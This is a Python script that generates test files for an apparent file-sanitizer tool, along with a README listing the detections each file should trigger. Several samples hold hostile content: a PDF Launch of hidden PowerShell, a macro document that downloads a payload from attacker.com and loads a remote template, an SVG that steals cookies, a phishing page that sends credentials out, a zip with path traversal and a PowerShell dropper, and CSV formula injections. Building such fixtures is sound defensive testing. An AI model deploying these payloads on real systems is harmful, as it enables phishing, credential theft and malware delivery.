import os
import zipfile
from pathlib import Path
from PIL import Image
from PIL.TiffImagePlugin import IFDRational
import fitz

BASE_DIR = Path(__file__).parent.resolve()

def create_image_with_gps():
    img_path = BASE_DIR / "image_gps_exif_metadata.jpg"
    img = Image.new("RGB", (640, 480), color=(70, 130, 180))
    exif = img.getexif()

    # Hardware & Software EXIF tags
    exif[0x010F] = "Sony"                                       # Make
    exif[0x0110] = "ILCE-7M4 (Alpha 7 IV)"                      # Model
    exif[0x0131] = "Adobe Photoshop Lightroom Classic 13.2"    # Software
    exif[0x013B] = "Jane Doe (Security Analyst)"                # Artist
    exif[0x8298] = "Copyright (c) 2026 Jane Doe. All Rights"   # Copyright
    exif[0x0132] = "2026:03:15 14:22:45"                       # DateTimeOriginal

    # GPS IFD coordinates (Stockholm City Hall: 59°19'45" N, 18°04'07" E)
    gps_ifd = exif.get_ifd(0x8825)
    gps_ifd[1] = "N"
    gps_ifd[2] = (IFDRational(59, 1), IFDRational(19, 1), IFDRational(45, 1))
    gps_ifd[3] = "E"
    gps_ifd[4] = (IFDRational(18, 1), IFDRational(4, 1), IFDRational(7, 1))

    img.save(img_path, format="JPEG", exif=exif, quality=95)
    print(f"Created: {img_path.name}")

def create_clean_image():
    img_path = BASE_DIR / "clean_image.png"
    img = Image.new("RGB", (200, 200), color=(46, 204, 113))
    img.save(img_path, format="PNG")
    print(f"Created: {img_path.name}")

def create_suspicious_pdf():
    pdf_path = BASE_DIR / "suspicious_javascript_actions.pdf"
    doc = fitz.open()

    page = doc.new_page(width=595, height=842)
    page.insert_text(
        (50, 70),
        "URGENT WIRE TRANSFER AUTHORIZATION\n\n"
        "Please review the attached invoice details below.\n"
        "Verify credentials at: https://secure-login.untrusted-verify.xyz/auth\n"
        "Support portal: https://external-cloud-service.com/help\n",
        fontsize=12
    )

    doc.set_metadata({
        "title": "Confidential Wire Transfer Notice",
        "author": "Dr. Malicious Sender",
        "subject": "Exfiltration Test",
        "creator": "Adobe Acrobat Pro 2024",
        "producer": "FileSanitizer Generator",
        "keywords": "wire, invoice, confidential, banking"
    })

    # Embedded file attachment
    doc.embfile_add("confidential_payroll.csv", b"EmployeeID,Name,Salary\n101,John Doe,125000\n102,Jane Smith,135000\n", filename="confidential_payroll.csv")
    doc.save(str(pdf_path))
    doc.close()

    # Append raw JavaScript trigger and Launch action into the PDF stream
    raw = pdf_path.read_bytes()
    injected = raw + (
        b"\n/JavaScript << /JS (app.alert('Warning: FileSanitizer Embedded PDF JavaScript Test Payload!');) >>\n"
        b"/Launch << /F (powershell.exe) /P (-NoP -NonI -W Hidden -Exec Bypass) >>\n"
        b"/OpenAction << /S /JavaScript /JS (app.alert('OpenAction Triggered');) >>\n"
    )
    pdf_path.write_bytes(injected)
    print(f"Created: {pdf_path.name}")

def create_clean_pdf():
    pdf_path = BASE_DIR / "clean_document.pdf"
    doc = fitz.open()
    page = doc.new_page(width=595, height=842)
    page.insert_text(
        (50, 80),
        "Project Architecture & Implementation Overview\n\n"
        "This is a benign, clean document with standard static text.\n"
        "It contains no JavaScript, no macros, no attachments, and no external trackers.\n",
        fontsize=12
    )
    doc.save(str(pdf_path))
    doc.close()
    print(f"Created: {pdf_path.name}")

def create_macro_office_document():
    docm_path = BASE_DIR / "office_vba_macro_template_injection.docm"
    with zipfile.ZipFile(docm_path, 'w', compression=zipfile.ZIP_DEFLATED) as zf:
        # [Content_Types].xml specifying macroEnabled document
        zf.writestr("[Content_Types].xml", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">\n'
            '  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>\n'
            '  <Default Extension="xml" ContentType="application/xml"/>\n'
            '  <Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>\n'
            '  <Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>\n'
            '</Types>'
        ))

        # _rels/.rels with remote template injection
        zf.writestr("_rels/.rels", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
            '  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
            'Target="http://c2-infrastructure.malicious-domain.xyz/templates/exploit.dotm" TargetMode="External"/>\n'
            '  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
            'Target="word/document.xml"/>\n'
            '</Relationships>'
        ))

        # word/document.xml
        zf.writestr("word/document.xml", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">\n'
            '  <w:body>\n'
            '    <w:p><w:r><w:t>URGENT: Please enable macros to view protected financial contents.</w:t></w:r></w:p>\n'
            '  </w:body>\n'
            '</w:document>'
        ))

        # Embedded VBA project stream (with standard AutoOpen / Document_Open hook tokens)
        mock_vba = (
            b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1" +
            b"Attacker Macro Stream vbaProject\x00" +
            b"Sub AutoOpen()\x00" +
            b"  Shell('calc.exe')\x00" +
            b"  URLDownloadToFile('http://attacker.com/bin', 'payload.exe')\x00" +
            b"End Sub\x00"
        )
        zf.writestr("word/vbaProject.bin", mock_vba)

        # docProps/core.xml metadata
        zf.writestr("docProps/core.xml", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" '
            'xmlns:dc="http://purl.org/dc/elements/1.1/">\n'
            '  <dc:title>Overdue Invoice #9401</dc:title>\n'
            '  <dc:creator>APT Group 29</dc:creator>\n'
            '</cp:coreProperties>'
        ))
    print(f"Created: {docm_path.name}")

def create_clean_office_document():
    docx_path = BASE_DIR / "clean_office_document.docx"
    with zipfile.ZipFile(docx_path, 'w', compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">\n'
            '  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>\n'
            '  <Default Extension="xml" ContentType="application/xml"/>\n'
            '  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>\n'
            '</Types>'
        ))
        zf.writestr("_rels/.rels", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
            '  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>\n'
            '</Relationships>'
        ))
        zf.writestr("word/document.xml", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">\n'
            '  <w:body>\n'
            '    <w:p><w:r><w:t>Quarterly Meeting Minutes. All systems operational.</w:t></w:r></w:p>\n'
            '  </w:body>\n'
            '</w:document>'
        ))
    print(f"Created: {docx_path.name}")

def create_active_svg():
    svg_path = BASE_DIR / "active_content_xss.svg"
    svg_content = """<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400" height="300" viewBox="0 0 400 300">
    <rect width="100%" height="100%" fill="#f1f5f9"/>
    <circle cx="200" cy="150" r="80" fill="#ef4444" onload="alert('XSS: SVG DOM onload executed!');"/>
    
    <!-- Script Execution -->
    <script type="text/javascript">
        console.warn("Active script payload in SVG vector container.");
        window.location.href = "https://phishing-portal.malicious-site.xyz/exfiltrate?cookie=" + document.cookie;
    </script>
    
    <!-- JavaScript Pseudo-Protocol Link -->
    <a xlink:href="javascript:alert('JavaScript URL Triggered');">
        <text x="200" y="270" text-anchor="middle" font-size="14" fill="#0f172a">Click for Special Promotion</text>
    </a>
    
    <!-- External Reference -->
    <image xlink:href="http://tracker.remote-beacon.xyz/pixel.png" width="1" height="1"/>
</svg>"""
    svg_path.write_text(svg_content, encoding="utf-8")
    print(f"Created: {svg_path.name}")

def create_phishing_html():
    html_path = BASE_DIR / "phishing_login_with_iframes.html"
    html_content = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="30;url=http://attacker-redirect.xyz/landing">
    <title>Urgent Security Verification</title>
    <script>
        function exfiltrateCredentials() {
            var user = document.getElementById('username').value;
            fetch('http://exfil.remote-server.xyz/keys?u=' + encodeURIComponent(user));
        }
    </script>
</head>
<body onload="console.log('Phishing page loaded');">
    <h2>Corporate Account Verification</h2>
    <p>Please enter your corporate single sign-on credentials below:</p>
    
    <form action="http://malicious-login-collector.xyz/login.php" method="POST" onsubmit="exfiltrateCredentials();">
        <label>Corporate Email: <input type="text" id="username" name="email"></label><br><br>
        <label>Domain Password: <input type="password" name="password"></label><br><br>
        <input type="submit" value="Verify Identity">
    </form>

    <h3>Internal Portal Mirror:</h3>
    <iframe src="https://example.com" width="600" height="300" style="border:1px solid #ccc;"></iframe>
</body>
</html>"""
    html_path.write_text(html_content, encoding="utf-8")
    print(f"Created: {html_path.name}")

def create_dangerous_archive():
    zip_path = BASE_DIR / "dangerous_archive_with_traversal.zip"
    with zipfile.ZipFile(zip_path, 'w', compression=zipfile.ZIP_DEFLATED) as zf:
        # Directory traversal payload
        zf.writestr("../../etc/passwd", "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n")
        # Script payload
        zf.writestr("powershell_dropper.ps1", "powershell.exe -ExecutionPolicy Bypass -Command 'Invoke-WebRequest -Uri http://malicious.xyz/payload.exe -OutFile C:\\temp\\evil.exe'\n")
        # Executable batch script
        zf.writestr("setup_installer.bat", "@echo off\necho Installing backdoor...\nstart /b powershell_dropper.ps1\n")
        # Harmless readme
        zf.writestr("read_me_first.txt", "Please execute setup_installer.bat to proceed with update installation.\n")
    print(f"Created: {zip_path.name}")

def create_eicar_test_file():
    eicar_path = BASE_DIR / "eicar_standard_av_test.txt"
    eicar_string = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    eicar_path.write_bytes(eicar_string)
    print(f"Created: {eicar_path.name}")

def create_spreadsheet_injection_csv():
    csv_path = BASE_DIR / "spreadsheet_formula_injection.csv"
    csv_content = (
        "Employee_ID,Full_Name,Department,Salary,Notes\n"
        "E-1001,John Smith,Engineering,95000,Approved promotion\n"
        "=cmd|'/C calc.exe'!A0,Alice Johnson,Finance,120000,DDE Execution Injection Test Cell\n"
        "+powershell.exe -enc ZWNobyAnaGVsbG8n,Bob Miller,Security,110000,Formula Prefix Plus Command\n"
        "@SUM(1+1)*cmd|'/C notepad.exe'!A0,Carol White,Human Resources,85000,Formula Prefix At Command\n"
        "E-1005,David Brown,Marketing,78000,Standard benign row\n"
    )
    csv_path.write_text(csv_content, encoding="utf-8")
    print(f"Created: {csv_path.name}")

def create_readme():
    readme_path = BASE_DIR / "README.md"
    readme_content = """# FileSanitizer Test Files Suite

This directory contains test files specifically crafted to exercise FileSanitizer's security analyzers, Content Disarm & Reconstruction (CDR) engines, metadata extractors, and antivirus scanners.

| File Name | Intended Security Triggers | Expected App Reaction |
| :--- | :--- | :--- |
| `image_gps_exif_metadata.jpg` | Embedded GPS coordinates (Stockholm: 59°19'45" N, 18°04'07" E), Camera Hardware (Sony Alpha 7 IV), Author (Jane Doe), Software. | Detected in **Location** & **Camera** metadata tabs. Flagged as **SENSITIVE**. Sanitization strips EXIF/GPS and re-encodes. |
| `clean_image.png` | Standard clean PNG with zero metadata or scripts. | Evaluated as **CLEAN**. |
| `suspicious_javascript_actions.pdf` | Embedded JavaScript (`app.alert`), `/Launch` command, OpenAction trigger, external URL, and embedded CSV attachment. | Classified as **HIGH RISK**. Flags JS alert, Launch action, and attachments. "Maximum Sanitization" rasterizes pages to pure pixel images. |
| `clean_document.pdf` | Benign clean PDF document with plain text. | Evaluated as **CLEAN**. |
| `office_vba_macro_template_injection.docm` | Embedded VBA macro binary stream (`vbaProject.bin`), external template injection relationship (`attachedTemplate`), Author metadata. | Triggers prominent **MACROS DETECTED** banner. Classified as **HIGH RISK**. Sanitizer purges macro streams and neutralizes external rels. |
| `clean_office_document.docx` | Standard OpenXML document without macros or external targets. | Evaluated as **CLEAN**. |
| `active_content_xss.svg` | Embedded `<script>` block, inline `onload` DOM event handler, `javascript:` URI, and external tracker beacon image. | Flagged as active content risk. Sanitizer strips scripts or rasterizes to PNG. |
| `phishing_login_with_iframes.html` | Embedded `<iframe>`, credential `<form>`, inline scripts, and `<meta http-equiv="refresh">` redirect. | Flagged as interactive form & script risk. Sanitizer decomposes iframes, neutralizes forms, and strips scripts. |
| `dangerous_archive_with_traversal.zip` | Directory traversal entry (`../../etc/passwd`), executable batch script (`.bat`), and PowerShell payload (`.ps1`). | Flagged with **Critical Path Traversal** and **Executable Payload** findings. Sanitizer excludes dangerous members. |
| `eicar_standard_av_test.txt` | Standard, inert 68-character EICAR antivirus test signature. | ClamAV detects **`Eicar-Test-Signature`** with status **MALICIOUS**. Original download and standard sanitization are blocked. |
| `spreadsheet_formula_injection.csv` | CSV cells starting with formula execution prefixes (`=cmd\|...`, `+powershell...`, `@SUM...`). | Flagged as **Spreadsheet Formula Injection Detected**. Sanitizer escapes formula prefixes with leading quotes (`'`). |
"""
    readme_path.write_text(readme_content, encoding="utf-8")
    print(f"Created: {readme_path.name}")

if __name__ == "__main__":
    create_image_with_gps()
    create_clean_image()
    create_suspicious_pdf()
    create_clean_pdf()
    create_macro_office_document()
    create_clean_office_document()
    create_active_svg()
    create_phishing_html()
    create_dangerous_archive()
    create_eicar_test_file()
    create_spreadsheet_injection_csv()
    create_readme()
    print("\nAll test files successfully generated!")
